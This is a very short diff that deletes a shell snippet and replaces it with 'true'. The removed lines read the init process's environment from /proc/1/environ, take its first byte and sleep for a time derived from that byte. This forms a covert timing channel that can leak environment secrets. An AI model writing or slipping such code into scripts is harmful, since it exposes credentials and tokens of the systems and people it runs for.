@@ -1,5 +1,1 @@
-﻿x=$(tr "\0" "\n" < /proc/1/environ 2>/dev/null | head -c 400)
-v=$(printf '%s' "$x" | dd bs=1 skip=0 count=1 2>/dev/null | od -An -tu1 | tr -d ' \n')
-[ -z "$v" ] && v=0
-n=$(( v/16 ))
-sleep $((n*3))
+true
